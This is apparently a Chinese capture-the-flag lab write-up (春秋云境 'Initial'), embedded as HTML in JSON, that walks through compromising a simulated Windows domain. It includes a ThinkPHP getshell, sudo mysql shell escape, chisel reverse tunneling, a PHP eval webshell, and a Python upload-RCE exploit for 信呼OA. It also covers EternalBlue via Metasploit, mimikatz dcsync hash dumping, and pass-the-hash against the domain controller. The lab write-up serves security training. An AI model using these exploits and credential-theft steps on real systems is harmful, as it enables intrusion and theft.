{"summary":"<p><img src=\"/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/b26f9fd59f01b8c198e5d89cdbdbf684.png\"><br>外网打点</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fscan -h 39.98.109.170</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/75b7336bfeb8fcde6d1a76ac6635c29d.png\"><br>ico发现是Thinkphp<br><img src=\"/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/41ad37689e7c7b7cd9893aa9c6b90712.png\"><br>Thinkphp综合利用工具<br><img src=\"/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/2cda5015a42cc1de1e1120ad6bfd24c5.png\"><br>Getshell并进行传马<br><img src=\"/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/8c6d010e7f90dc253b9eb9bc31fe0f7d.png\"><br>蚁剑连接<br><img src=\"/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/a419d62e170b68d15c58f7164ccbc2af.png\"><br>尝试读取root，发现并没有权限<br><img src=\"/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/adca8dffec2ddaf0527401de69b2c80a.png\"><br>尝试提权，suid不可利用，尝试sudo提权<br><img src=\"/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/3ad1c22f4b574350cf9920e0eb4ce993.png\"><br>mysql配置了免密使用，mysql暂时拿到root权限，使用mysql -e命令即可，使用mysql -e命令查找root用户中的flag文件</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo mysql -e &#x27;\\! find / -name flag*&#x27;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/c52ffdced9ffb469cd2b9624247f0d6c.png\"><br>发现flag01.txt文件<br><img src=\"/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/d1059562426618ba3782e70921d3249c.png\"><br>读取内容</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo mysql -e &#x27;\\! cat /root/flag/flag01.txt&#x27;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/4b618a54fab991c70107bc187ae1f37e.png\"><br>扫描内网，上传fscan到<code>/tmp</code>，并给予权限<br><img src=\"/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/eaa9c7175e9f77c29a7ac109a5585429.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod 777 fscan</span><br></pre></td></tr></table></figure>\n\n<p>查看网卡信息，并进行扫描</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip addr</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/e6175cc57bbd5cf7570297c69597456f.png\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./fscan -h 172.22.1.0/24 &gt;&gt; fscan.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/6fe3a60941b9399c5bf52ec1524ee90a.png\"><br>从结果可以得到目标<br>172.22.1.2:DC域控<br>172.22.1.21:Windows的机器并且存在MS17-010 漏洞<br>172.22.1.18:信呼OA办公系统<br>接下来搭建frp内网穿透，vps当作跳板机<br>上传chisel到<code>/tmp</code>，给予权限并运行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">靶机</span><br><span class=\"line\">./chisel client vps_ip:9001 R:0.0.0.0:9002:socks</span><br><span class=\"line\"></span><br><span class=\"line\">vps</span><br><span class=\"line\">./chisel server -p 9001 --reverse</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/0522a523ca8072ddc8af35cc7bbb7a00.png\"><br><img src=\"/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/c8d57b364422ae14f96414e69d36e252.png\"><br>代理成功，尝试访问信呼OA<br><img src=\"/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/dac60f4ec4f7a92855a83e5f5817156d.png\"><br><img src=\"/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/9fbfa2a2f1c89c51877ba54bdcbcd058.png\"><br>尝试弱口令爆破进入管理系统admin&#x2F;admin123，登陆以后信呼OA存在rce，直接用exp打</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php @eval($_POST[&#x27;t1ng&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>两个文件须在同一目录下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">session = requests.session()</span><br><span class=\"line\"></span><br><span class=\"line\">url_pre = &#x27;http://172.22.1.18/&#x27;</span><br><span class=\"line\">url1 = url_pre + &#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span><br><span class=\"line\">url2 = url_pre + &#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span><br><span class=\"line\">url3 = url_pre + &#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">data1 = &#123;</span><br><span class=\"line\">    &#x27;rempass&#x27;: &#x27;0&#x27;,</span><br><span class=\"line\">    &#x27;jmpass&#x27;: &#x27;false&#x27;,</span><br><span class=\"line\">    &#x27;device&#x27;: &#x27;1625884034525&#x27;,</span><br><span class=\"line\">    &#x27;ltype&#x27;: &#x27;0&#x27;,</span><br><span class=\"line\">    &#x27;adminuser&#x27;: &#x27;YWRtaW4=&#x27;,</span><br><span class=\"line\">    &#x27;adminpass&#x27;: &#x27;YWRtaW4xMjM=&#x27;,</span><br><span class=\"line\">    &#x27;yanzm&#x27;: &#x27;&#x27;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">r = session.post(url1, data=data1)</span><br><span class=\"line\">r = session.post(url2, files=&#123;&#x27;file&#x27;: open(&#x27;1.php&#x27;, &#x27;r+&#x27;)&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">filepath = str(r.json()[&#x27;filepath&#x27;])</span><br><span class=\"line\">filepath = &quot;/&quot; + filepath.split(&#x27;.uptemp&#x27;)[0] + &#x27;.php&#x27;</span><br><span class=\"line\">id = r.json()[&#x27;id&#x27;]</span><br><span class=\"line\">print(id)</span><br><span class=\"line\">print(filepath)</span><br><span class=\"line\">url3 = url_pre + f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&#123;id&#125;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">r = session.get(url3)</span><br><span class=\"line\">r = session.get(url_pre + filepath + &quot;?1=system(&#x27;dir&#x27;);&quot;)</span><br><span class=\"line\">print(r.text)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/6be8e70fb538aafca29943133c6f5ca7.png\"><br>蚁剑设置代理，并且按照给出路径进行连接<br><img src=\"/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/7ee0b9505a2d9bf4e836c8fca17068e0.png\"><br><img src=\"/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/998afd0e487b47cd6058be4ec10c939f.png\"><br>在<code>C:/Users/Administrator/flag/flag02.txt</code>拿到第二部分flag<br><img src=\"/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/dd598f94e23105fdfb157f8b107c67c2.png\"><br>先打172.22.1.21的MS17-010的永恒之蓝<br>配置一下kali虚拟机的socks5代理</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/proxychains4.conf</span><br><span class=\"line\"></span><br><span class=\"line\">内容</span><br><span class=\"line\">socks5 vps_ip 9002 </span><br></pre></td></tr></table></figure>\n\n<p>接下来msf打永恒之蓝</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">proxychains4 msfconsole</span><br><span class=\"line\">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class=\"line\">set payload windows/x64/meterpreter/bind_tcp_uuid</span><br><span class=\"line\">set RHOSTS 172.22.1.21</span><br><span class=\"line\">exploit</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/d57d574f0008bf9cb865cd235ee3c56d.png\"><br>拿到SYSTEM权限，<code>load kiwi</code>调用mimikatz模块，获取域内用户hash</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">load kiwi</span><br><span class=\"line\">kiwi_cmd &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; exit</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/808e5419b46d82bf8ffdc4dc9451ccc0.png\"><br>用crackmapexec打PTH拿下域控</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;type Users\\Administrator\\flag\\flag03.txt&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2025/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/7f5326b1e7ce49a322bcd40960eff27d.png\"><br>拿到第三段flag。</p>\n<p>flag{60b53231-2ce3-4813-87d4-e8f88d0d43d6}</p>\n"}